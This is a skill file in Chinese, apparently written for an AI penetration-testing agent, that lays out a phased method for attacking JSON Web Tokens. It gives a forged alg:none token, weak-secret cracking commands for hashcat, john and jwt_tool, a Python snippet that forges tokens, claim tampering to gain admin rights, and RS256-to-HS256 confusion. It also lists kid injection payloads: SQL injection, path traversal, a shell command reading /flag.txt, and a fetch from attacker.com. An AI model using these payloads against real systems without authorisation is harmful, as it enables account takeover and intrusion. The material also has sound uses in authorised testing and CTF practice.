---
name: jwt-attack-methodology
description: "JWT Token 攻击方法论。当响应头/Cookie 中出现 eyJ 开头的字符串（三段式 base64，Header.Payload.Signature）、Authorization: Bearer token、API 返回 token/access_token 字段时使用。包含 alg:none 绕过、弱密钥爆破（hashcat/john/c-jwt-cracker/jwt_tool 完整工具链）、Claims 篡改提权、RS256->HS256 算法混淆、kid 注入（SQL/路径穿越/命令注入）、jku/x5u 替换。注意：非 JWT 的 Cookie 分析请使用 cookie-analysis"
metadata:
  tags: "jwt,json web token,authentication,token,none-algorithm,weak-secret,bearer,eyJ,jwt_tool,HS256,RS256,kid,jku,算法混淆,密钥爆破,alg none,claims篡改"
  category: "exploit"
---

# JWT 攻击方法论

## Phase 1: 获取和解码 JWT
1. 登录获取 token（检查响应头 Set-Cookie 和响应体 JSON 字段）
2. 确认 JWT 格式：三段 Base64 由 `.` 分隔（Header.Payload.Signature）
3. 使用 jwt_decode 工具或 `echo '<part>' | base64 -d` 手动解码：
   - Header：检查 `alg` 字段（HS256/RS256/none）、`kid`/`jku`/`x5u` 参数
   - Payload：检查 `sub`、`role`、`admin`、`is_admin`、`user_id`、`exp` 等 Claims
   - 记录签名算法、过期时间、关键权限字段
4. 检查 token 是否过期：`exp` 字段转换为 Unix 时间戳对比当前时间
5. 对比不同用户的 JWT，找出权限相关字段的差异

## ⛔ 深入参考（发现 JWT 后必读）

- RS256→HS256 算法混淆、kid 注入（SQL/路径穿越/命令注入）、jku/x5u 替换 → [references/jwt-advanced.md](references/jwt-advanced.md)
- 弱密钥爆破完整工具链（hashcat/john/c-jwt-cracker/jwt_tool/Python + 弱密钥模式表） → [references/jwt-advanced.md](references/jwt-advanced.md)

## Phase 2: None Algorithm 攻击
1. 将 Header 中 `alg` 改为 `none`，删除 Signature 部分（保留末尾的 `.`）
2. 重新 Base64 编码 Header 和 Payload，拼接为 `header.payload.`
3. 发送请求，观察服务端是否接受无签名 token
4. 尝试大小写变种绕过：`"none"`, `"None"`, `"NONE"`, `"nOnE"`, `"NoNe"`
5. 某些库只在 alg 为精确 `"none"` 时绕过，需逐个测试
```
原始: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE
攻击: eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

## Phase 3: 弱密钥爆破（HS256/HS384/HS512 专用）
1. 手动测试常见弱密钥：`secret`, `password`, `123456`, `key`, `jwt_secret`, `changeme`, `""`（空字符串）
2. 使用 hashcat 离线爆破：`hashcat -m 16500 jwt.txt wordlist.txt`
3. 使用 john：`john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256`
4. 轻量工具 c-jwt-cracker：`./jwtcrack <token>`（纯暴力，适合短密钥）
5. jwt_tool 综合工具：`python3 jwt_tool.py <token> -C -d wordlist.txt`
6. 知道密钥后伪造 token：
```python
import jwt; print(jwt.encode({'user':'admin','role':'admin'}, 'SECRET_KEY', algorithm='HS256'))
```
→ **完整爆破工具链和弱密钥模式表** → [references/jwt-advanced.md](references/jwt-advanced.md)

## Phase 4: Claims 篡改
1. 解码 Payload，列出所有 Claims 字段
2. 修改权限相关字段：`role:user→admin` | `is_admin:false→true` | `user_id:5→1`
3. 尝试添加新字段：`"admin":true`、`"groups":["admin"]`
4. 修改 `exp` 延长 token 有效期（如改为 2099 年时间戳）
5. 使用已知密钥重新签名，替换原 token 发送请求
6. 对比响应确认权限是否提升（检查 HTTP 状态码、响应内容、可访问的端点）

## Phase 5: RS256→HS256 算法混淆
1. 确认服务端使用 RS256（非对称）算法签名
2. 获取公钥：请求 `/api/jwks`、`/.well-known/jwks.json`、`/oauth/jwks`
3. 将 Header 中 `alg` 从 `RS256` 改为 `HS256`
4. 使用 RS256 的公钥作为 HS256 的对称密钥签名 token
5. 发送篡改后的 token，利用服务端用公钥做 HMAC 验证的逻辑漏洞
→ 详细原理和脚本 → [references/jwt-advanced.md](references/jwt-advanced.md)

## Phase 6: kid 参数注入
1. 检查 JWT Header 中是否存在 `kid`（Key ID）字段
2. SQL 注入：`"kid":"1' UNION SELECT 'my-key' -- "` → 用 `my-key` 签名
3. 路径穿越：`"kid":"../../dev/null"` → 用空文件内容作为密钥签名
4. 命令注入：`"kid":"key|cat /flag.txt"` → 某些实现会执行 shell 命令
5. SSRF：`"kid":"http://attacker.com/key"` → 从攻击者服务器获取密钥
→ 完整 payload → [references/jwt-advanced.md](references/jwt-advanced.md)

